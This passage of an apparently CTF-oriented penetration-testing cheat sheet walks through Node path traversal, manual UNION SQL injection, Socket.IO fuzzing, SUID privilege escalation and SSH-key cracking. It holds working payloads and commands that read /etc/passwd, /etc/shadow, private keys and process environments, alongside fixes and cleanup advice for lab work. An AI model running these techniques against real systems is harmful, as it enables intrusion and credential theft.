and the rotation loop, run *those* in Node, and print the real mapping. Never runs the DOM/network
parts:

```js
// deobf.js — node deobf.js app.js
const fs = require('fs');
const src = fs.readFileSync(process.argv[2], 'utf8');
const arrFn  = src.match(/function _0x5f26\(\)\{[\s\S]*?return _0x5f26\(\);\}/)[0];
const accFn  = src.match(/function _0x42b1\([\s\S]*?\}\s*;?\s*(?=let|const)/)[0];
const rotate = src.match(/\(function\([\s\S]*?\}\(_0x5f26,0x[0-9a-f]+\)\);/)[0];
fs.writeFileSync('/tmp/_h.js', `${arrFn}\n${accFn}\nconst _0x267948=_0x42b1;\n${rotate}\nmodule.exports=_0x42b1;`);
const decode = require('/tmp/_h.js');
const idxs = [...new Set([...src.matchAll(/\(0x([0-9a-f]{2,3})\)/g)].map(m => parseInt(m[1], 16)))].sort((a,b)=>a-b);
for (const i of idxs) console.log('0x' + i.toString(16), '=>', JSON.stringify(decode(i)));
```
Swap the three function names for whatever your file uses. Substitute the mapping back by hand and
the code reads normally.

> **Lesson:** obfuscation is not a security control. A base64 flag behind an `if` in the browser is
> a flag you already downloaded. Anything the browser can eventually display, it already holds.

## 15. WebSockets & Socket.IO

**Spot it:** `<script src="https://cdn.socket.io/...">` in the page, or a `/socket.io/` path.

**Confirm the protocol version before writing any client** (the handshake is plain HTTP):
```bash
curl -s "http://$IP/socket.io/?EIO=4&transport=polling"   # 0{"sid":"...","upgrades":["websocket"]} -> v3/v4
curl -s "http://$IP/socket.io/?EIO=3&transport=polling"   # {"code":5,"message":"Unsupported protocol version"}
```
`EIO=4` is Socket.IO v3/v4; `EIO=3` is v2. Install the matching client or nothing will connect:
```bash
npm init -y >/dev/null && npm install socket.io-client@4 --silent
```

**Namespaces vs events.** A *namespace* is a URL-ish channel (`/yaml`); an *event* is a named message
inside it. Both are defined in server code, so neither shows up in a directory sweep.

**Listen to everything with `onAny` — the wildcard listener:**
```js
// listen.js
const { io } = require('socket.io-client');
const BASE = 'http://<IP>';
for (const ns of ['/', '/yaml', '/nostromo']) {
  const s = io(BASE + ns, { transports: ['websocket'] });
  s.on('connect',       () => console.log(`[${ns}] connected id=${s.id}`));
  s.on('connect_error', (e) => console.log(`[${ns}] error: ${e.message}`));
  s.onAny((event, ...args) => console.log(`[${ns}] EVENT ${event} :: ${JSON.stringify(args)}`));
}
setTimeout(() => process.exit(0), 8000);
```
`s.on('name', ...)` needs the event name in advance; **`onAny` fires for every event whatever its
name** — the right tool for an unknown socket API.

**Namespace existence is an oracle:** connecting to a namespace the server never defined fails with
`Invalid namespace`. A successful `connect` proves a `connection` handler exists server-side.

**Fuzz event names** (emit with an ack callback *and* keep `onAny` attached — a handler may reply
either way; reserved names throw client-side, so skip them):
```js
const RESERVED = new Set(['connect','connect_error','disconnect','disconnecting','newListener','removeListener']);
for (const w of words.filter(w => !RESERVED.has(w))) {
  try { s.emit(w, 'test', (...ack) => console.log(`ACK '${w}' ::`, ack)); } catch (e) {}
}
```

> **Check the direction first.** `grep -c emit` on the client bundle. If the client only *listens*,
> the socket is a **scoreboard, not an attack surface** — the server broadcasts on it when something
> happens over HTTP. Fuzzing event names there burns thousands of requests for nothing (it did here:
> 9224 emits, zero replies).

## 16. Node / Express LFI & path traversal

### 16.1 The vulnerable pattern

```js
const filePath = `./public/${req.body.file_path}`;   // string concatenation — no containment
fs.readFile(filePath, 'utf8', ...);
```
`path.join()` is **not** a fix either: it resolves `../` happily, and it treats a leading `/` as just
another segment. That produces the signature you can detect from outside:

| Payload | Result | Why |
|---|---|---|
| `/etc/passwd` | fails | absolute path gets glued onto the base directory |
| `../../../../etc/passwd` | **works** | `..` segments are resolved, walking out of the base |

So if absolute fails but relative works, you are looking at concatenation or `path.join` — keep going.

### 16.2 Find the parameter, then map the depth

```bash
# parameter name: watch for a DIFFERENT error message (see §6.3)
for k in file_path filepath filePath file path name filename url src data; do
  printf '%-12s -> ' "$k"
  curl -s -X POST -H 'Content-Type: application/json' -d "{\"$k\":\"test.yaml\"}" http://$IP/<endpoint>; echo
done

# how deep is the base directory? probe with a file you KNOW exists
for d in 1 2 3 4 5 6; do
  p=$(python3 -c "print('../'*$d)")
  printf 'depth %s -> ' "$d"
  curl -s -X POST -H 'Content-Type: application/json' \
       -d "{\"file_path\":\"${p}etc/hostname\"}" http://$IP/<endpoint>; echo
done
```
The first depth that works tells you how many levels below `/` the base directory sits. **Overshooting
is free** — `..` at `/` is still `/` — so in practice just send plenty of `../`.

**Good known-exists probe files** (harmless, present on nearly every Ubuntu host):
`/etc/hostname` · `/etc/passwd` · `/etc/netplan/50-cloud-init.yaml` (when the read is restricted to `.yaml`)

### 16.3 Extension whitelists — test whether the check is anchored

A check like `filename.split('.').pop() === 'yaml'` only cares what the string **ends with**, never
**where the file is**. Probe how strict it is:

```bash
for f in "test.yaml" "test.yml" "test.yaml.txt" "a.yaml/../../../../etc/passwd" \
         "../../../../etc/passwd.yaml" "test.yaml%00.txt"; do
  printf '%-40s -> ' "$f"
  curl -s -X POST -H 'Content-Type: application/json' -d "{\"file_path\":\"$f\"}" http://$IP/<endpoint>; echo
done
```
If `a.yaml/../../etc/passwd` passes, the check is a non-anchored `includes()` and you can read
anything. If only `*.yaml` passes, you are limited to that extension — still enough to read config.
Null bytes (`%00`) have not worked in Node since v8; try it once, then move on.

> **The bug in one line:** an extension check answers *"what kind of file"*. Traversal is a *"which
> file"* problem. Never let one stand in for the other.

### 16.4 The fix (know this for the report)

```js
const ROOT = path.resolve('./public');
const target = path.resolve(ROOT, userInput);
if (target !== ROOT && !target.startsWith(ROOT + path.sep)) return res.status(400).json({ error: 'bad path' });
```
**Resolve first, check second.** Validating the raw string before resolution is the mistake that
encoded-traversal payloads exist to defeat.

### 16.5 Make a silent app leak: attack the middleware, not the handler

Every route wrapped in try/catch? Body parsers, validators and session middleware run **outside** it.
Malformed JSON throws inside `express.json()`, bypasses the developer's error handling entirely, and
hits Express's default handler — which prints a full stack trace unless `NODE_ENV=production`:

```bash
curl -s -X POST -H 'Content-Type: application/json' -d '"broken' http://$IP/<endpoint> \
  | sed 's/<br>/\n/g; s/&nbsp;/ /g'
```
```
SyntaxError: Unexpected token '"' ...
    at createStrictSyntaxError (/home/ubuntu/mothers_secret_challenge/node_modules/body-parser/...)
```
That absolute path is often the whole game — it turns blind traversal into targeted source reading.
The `Content-Type` header is what makes the parser engage; without it the body is never parsed.

## 17. You have file read but no directory listing

`fs.readFile` on a directory returns `EISDIR`, which most apps render as the same error as a missing
file — so a read primitive gives you **no listing**. The fix is to read a file that *describes* the
filesystem.

```bash
R() { curl -s -X POST -H 'Content-Type: application/json' \
        -d "{\"file_path\":\"$1\"}" http://$IP/<endpoint>; }

R ../../../../proc/self/cmdline          # exact binary + script path + args
R ../../../../proc/self/environ          # USER / HOME / PWD / secrets in env vars
R ../../../../etc/systemd/system/<svc>.service   # ExecStart, User=, WorkingDirectory=
R ../../../../var/log/syslog             # app stdout/stderr, and the PID (did it restart?)
R ../../../../home/<user>/.bash_history  # how the box was built
R ../.git/index                          # EVERY tracked file path, in plaintext
R ../package-lock.json                   # dependency tree + versions
```

| Source | What it gives you |
|---|---|
| `/proc/self/cmdline` | the interpreter and script path — the app's real location |
| `/proc/self/environ` | `USER=root` means your read covers the **whole** filesystem |
| systemd unit | `WorkingDirectory` (what `./` resolves to) and `User=` |
| `/var/log/syslog` | app logs; a constant `node[PID]` proves the process never restarted |
| `.git/index` | **the file listing** — binary format, but paths are plain strings |

**`.git` left in a webroot is the single best find here:**
```bash
R ../.git/HEAD          # ref: refs/heads/main
R ../.git/config        # remote origin URL
R ../.git/logs/HEAD     # clone/pull/commit history with author + timestamps
R ../.git/index | strings -n 4 | grep -v node_modules | sort -u   # full tracked-file list
```
That listing is what finds files no wordlist ever will — `public/100375.yaml`, `0rd3r937.txt`.

> **Habit:** a read primitive plus a listing is worth far more than either alone. The moment you can
> read arbitrary files, go looking for the map before you go looking for the treasure.

## 18. SQL injection — UNION-based, end to end

The one class `sqlmap` will do for you and you must still be able to do by hand. Worked example:
a search form, `POST search=<input>`.

### 18.1 Detect: one character

```bash
curl -s -X POST -d "search=a&submit=1"  http://$IP/<endpoint> | wc -c    # 8360  baseline
curl -s -X POST -d "search='&submit=1"  http://$IP/<endpoint> | wc -c    # 2671  something broke
```
A single quote is the whole test. **Compare response sizes, not eyeballs** — the difference shows
up as a byte count before you read a word of HTML.

### 18.2 Read the error — it hands you the query shape

```
You have an error in your SQL syntax; ... near '%' AND post_status='publish'' at line 1
```
That tail tells you the input sits inside a `LIKE '%…%'`:
```sql
SELECT ... FROM posts WHERE post_tags LIKE '%<INPUT>%' AND post_status='publish'
```
So the break-out is `%'` — close the wildcard **and** the quote — then your SQL, then a comment.

| Context you land in | Break-out prefix |
|---|---|
| `WHERE col = '<in>'` | `'` |
| `WHERE col LIKE '%<in>%'` | `%'` |
| `WHERE id = <in>` (numeric) | nothing — inject directly |
| `ORDER BY <in>` | nothing; only `ASC/DESC`, column numbers, subqueries work |

**Comment syntax:** use `-- -` (dash dash space dash). MySQL requires whitespace after `--`, and a
plain trailing space gets stripped in transit; the extra `-` guarantees it survives. `#` works too
but must be URL-encoded as `%23`.

### 18.3 Count the columns

```bash
for n in $(seq 1 30); do   # go to 30, not 10 — see the warning below
  ... "a%' ORDER BY $n-- -" ...
done
```
`ORDER BY n` succeeds while `n` ≤ column count, then errors `Unknown column 'n' in 'order clause'`.

> **Trap:** if every value in your loop passes, that is **not** proof the injection failed — your
> range may just be too short. Send one deliberately absurd value (`ORDER BY 100`) to prove the
> mechanism errors at all. *Test the instrument before you doubt the result.*

### 18.4 Find which columns are printed

```
search=zzznope%' UNION SELECT 'c1','c2','c3','c4','c5','c6','c7','c8','c9','c10'-- -
```
Use a search term that matches **nothing** (`zzznope`) so the only rows on the page are yours.
Then read the HTML and see where each marker landed. Pick a column that sits alone inside a
distinctive tag and is **not truncated** by the template.

### 18.5 The extraction one-liner

```bash
Q() {
  curl -s -X POST --data-urlencode "search=zzznope%' UNION SELECT 1,2,($1),4,5,6,7,8,9,10-- -" \
    -d "submit=1" "http://$IP/<endpoint>" \
  | grep -oP '(?<=<h2><a href="#">).*?(?=</a></h2>)'
}
Q "database()"
```
| Piece | Why it matters |
|---|---|
| `--data-urlencode` | **mandatory.** The payload contains `%`, `'`, `&`, `+`. A raw `%` in a POST body reads as the start of a percent-escape and silently corrupts the payload |
| `($1)` in a column slot | parentheses let a whole `SELECT … FROM …` subquery sit where a column goes |
| `grep -oP '(?<=A).*?(?=B)'` | Perl lookarounds — match *between* two fixed strings, print only the middle |

### 18.6 Enumerate

```sql
database()                                                     -- current DB
user()                                                         -- DB user (privilege hint)
@@version
SELECT group_concat(schema_name) FROM information_schema.schemata
SELECT group_concat(table_name)  FROM information_schema.tables  WHERE table_schema=database()
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>'
SELECT group_concat(col1,'|',col2 SEPARATOR ' ### ') FROM <db>.<table>
```
`group_concat()` is the whole trick: a UNION column returns **one** value, and `group_concat`
collapses an entire result set into it. One request per question, not one per row.

> Always add `AND table_schema='<db>'` when querying `information_schema.columns` — without it you
> get same-named tables from `mysql`/`performance_schema` mixed into your column list.

### 18.7 When the output comes back empty

Long or HTML-bearing values break the extraction (they contain the tags you grep between, or blow
past `group_concat_max_len`, default 1024). Fixes, in order:

```sql
SELECT LENGTH(col) FROM t WHERE id=1                       -- how big is it really?
SELECT SUBSTRING(HEX(col), 1, 200) FROM t WHERE id=1       -- hex chunks, reassemble locally
SELECT REPLACE(REPLACE(col,'<','['),'>',']') FROM t        -- neutralise the tags
```
```bash
# pull it in 200-hex-char slices, then decode
for off in 1 201 401 601; do ... "SELECT SUBSTRING(HEX(col),$off,200) ..." ; done
echo "$hex" | xxd -r -p
```
`TO_BASE64()` is tidier but is not always available; `HEX()` always is.

### 18.8 Can you read files? (usually no)

```sql
SELECT group_concat(grantee) FROM information_schema.user_privileges WHERE privilege_type='FILE'
SELECT LOAD_FILE('/etc/hostname')
SELECT @@secure_file_priv
```
`LOAD_FILE` needs the **FILE** privilege *and* a permissive `secure_file_priv`. A web app's DB user
almost never has it — check in one request rather than assuming either way.

### 18.9 The fix (for the report)

```php
$stmt = $pdo->prepare("SELECT * FROM posts WHERE post_tags LIKE CONCAT('%', ?, '%') AND post_status='publish'");
$stmt->execute([$search]);
```
**Bind the value; never interpolate it.** Note the wildcards live in the *SQL*, not in the
parameter — so the user cannot supply their own quote to escape with. Escaping functions
(`mysqli_real_escape_string`) are a fallback, not a fix.

## 19. Linux privilege escalation — SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null | sort
```
| Piece | Meaning |
|---|---|
| `-perm -4000` | the **setuid** bit is set (`-` = "at least these bits") |
| `-type f` | regular files only |
| `2>/dev/null` | drop the permission-denied noise |

Ignore the stock list (`sudo mount su passwd pkexec chfn chsh gpasswd newgrp at fusermount
umount`, plus `/snap/...` copies). **Anything else is the finding.** Confirm with the package
manager — a setuid file the distro does not own is an incident:

```bash
dpkg -S /usr/bin/<suspect>      # "no path found" = not from any package
ls -la /usr/bin/<suspect>       # rws = setuid; the OWNER is who you become
```

### 19.1 Read it before you run it

```bash
file <bin>; strings <bin> | head -40
```
Prompts, format strings and libc imports (`fopen`, `system`, `execve`) tell you what it does
without a disassembler.

### 19.2 `system()` in a setuid binary — often NOT exploitable

An unqualified command inside `system("figlet ...")` looks like a free PATH hijack:

```bash
mkdir -p /tmp/x && printf '#!/bin/bash\nid > /tmp/x/out\n' > /tmp/x/figlet
chmod 755 /tmp/x/figlet
PATH=/tmp/x:$PATH /usr/bin/<suid-bin>
cat /tmp/x/out
```
Your script runs — **as your own user.** `system()` runs `/bin/sh -c`, and on Ubuntu `/bin/sh` is
**dash**, which drops the effective UID back to the real one when `euid != uid` (bash does the same
without `-p`). It is a deliberate, decades-old defence.

> Still test it: it *is* exploitable when `/bin/sh` is old or unusual, or when the hijacked command
> is reached through `execve`/`execlp` rather than a shell. Just do not assume it works — check
> `id` from inside the hijack before building on it.

### 19.3 The boring feature is usually the exploit

If `system()` drops privileges, the file I/O does not. A setuid "copy a file" utility is an
**arbitrary read and arbitrary write as its owner**:

```bash
printf "/etc/hostname\n/tmp/probe\n" | /usr/bin/<copy-bin>   # prove it works
ls -la /tmp/probe            # owner column = the binary's owner => primitive confirmed
```
| Target you want | Why |
|---|---|
| `~<user>/.ssh/id_rsa` | private key — crack the passphrase offline (§19.4) |
| `~<user>/.ssh/authorized_keys` | **write** your own key in — see the warning below |
| `/etc/shadow` (if owner is root) | hashes |
| any file the owner can read | config, source, secrets |

**Target directory permissions matter.** Copying *into* a directory you own but the binary's owner
does not (mode 755) fails. Use world-writable `/tmp`.

> **Prefer the read.** Overwriting `authorized_keys` destroys the owner's real access if you do not
> save the original. If you must write, **read the file out first, append, write it back** — and
> restore it afterwards. Ask: *what does this privileged program let me do*, not *what was it
> meant to do.*

### 19.4 Crack an SSH key passphrase

```bash
ssh2john id_rsa > key.hash            # or: python3 /usr/share/john/ssh2john.py id_rsa > key.hash
john --session=k --wordlist=rockyou.txt key.hash
john --show key.hash                  # id_rsa:<passphrase>
chmod 600 id_rsa && ssh -i id_rsa <user>@$IP
```
`aes256-ctr` / `bcrypt` in the key's base64 header means it is passphrase-encrypted.
`chmod 600` is mandatory — ssh refuses a world-readable key.

> Run concurrent John jobs with `--session=<name>`; otherwise the second one dies on
> `Crash recovery file is locked`.

### 19.5 Directory permission bits, read precisely

| Bit on a **directory** | Grants |
|---|---|
| `r` | **list** the names inside |
| `x` | **traverse** it and open a file **whose name you already know** |

`drwxrwx--x root:zeus <dir>` means everyone can be *served* a file from it over HTTP while nobody
outside the group can enumerate it. That is how a webroot directory survives every content sweep —
and why reading the filesystem as the right user is the only way in. `--x` is not protection, it is
a name you have not learned yet.

## 20. After root — collect, then clean up

### 20.1 Find flags by FORMAT, not by filename

```bash
find / -iname "*flag*" 2>/dev/null                      # misses .b0nus.fl4g, secret.txt, ...
grep -rhoaE "(flag|THM)\{[^}]{3,80}\}" / \
  --exclude-dir=proc --exclude-dir=sys --exclude-dir=snap --exclude-dir=usr \
  --binary-files=text 2>/dev/null | sort -u             # finds all of them
grep -rlaE "<fragment>" / --binary-files=text 2>/dev/null   # then locate the one you can't place
```
| Flag | Why |
|---|---|
| `-h` / `-l` | values first, then locations — two passes beats one noisy one |
| `-a` / `--binary-files=text` | flags live inside ELF binaries too (banners!) |
| `--exclude-dir` | skip virtual filesystems and 40k kernel headers |

**A filename can be obfuscated (`.b0nus.fl4g`); the answer format cannot.** Search for what the
author could not change.

### 20.2 Put the box back

Track what you drop **as you drop it**, and remove all of it:

```bash
rm -f <uploads>/<your-webshells>            # a webshell you leave behind is YOUR vulnerability
rm -rf /tmp/<your-scratch>
grep -v "<your-key-comment>$" ~<user>/.ssh/authorized_keys > /tmp/.t && mv /tmp/.t ~<user>/.ssh/authorized_keys
mysql -u <u> -p'<p>' <db> -e 'delete from <table> where <your rows>;'
```
Then **verify**, don't assume:
```bash
ssh -i <yourkey> -o BatchMode=yes root@$IP 'id'   # must be: Permission denied (publickey,password)
```
Remove your root access **last**. In an engagement, unremoved tooling is a finding against you.

### Quick habits that save time in the exam
- `export IP=...` once; reuse `$IP` everywhere.
- Always run **one** `nmap -p-` — never trust the default top-1000.
- On any HTTPS lab box, curl needs `-sk`.
- Read **client-side JS** before attacking an API — it documents endpoints/headers for you.
- An error message ("expired", "invalid email") often tells you *where to look next*, not just "no".
- Keep a running notes file of hostnames, endpoints, and creds — you'll reuse every one.
- A sweep that finds nothing is usually a **wordlist assumption**, not an absent feature. Name the
  assumption before you swap the list.
- Baseline the "wrong" response (`status:size`) before fuzzing anything, and filter on that.
- Decode every long base64 blob you see in client JS. It costs one command.
- Two failed fixes resting on the same untested premise = go test the premise, not a third fix.
- When a lab box misbehaves, the box is a suspect too. Re-run the exact request before building a
  theory on top of its failure.
- **Put `%{redirect_url}` in every probe format.** Two different `302:0` responses can differ only
  in `Location:` — that one header hid an entire vhost on Olympus (§4.1).
- **Run a known-good control through every new command.** An empty result means "not there" *or*
  "my request never arrived", and they look identical. `ffuf` has no `--resolve`: IP in the URL,
  name in `-H "Host:"`, always.
- Don't `2>/dev/null` a tool until you have watched it succeed once.
- Keep threads sane (`-t 25`). If the target goes slow mid-engagement, suspect **your** traffic
  first — a scan that knocks the box over costs you the box.
- A `/~user/` path in a directory sweep is a whole second application. Open it.
- Check you can **reach** an upload directory before crafting a payload for it.
- With a shell: `find / -perm -4000 -type f` and ask which entries the package manager doesn't own.
- With root: grep for the flag **format**, not the filename — `.b0nus.fl4g` beats `find -name "*flag*"`.
- Remove every shell, key and temp file you created, then **prove** your access is gone.
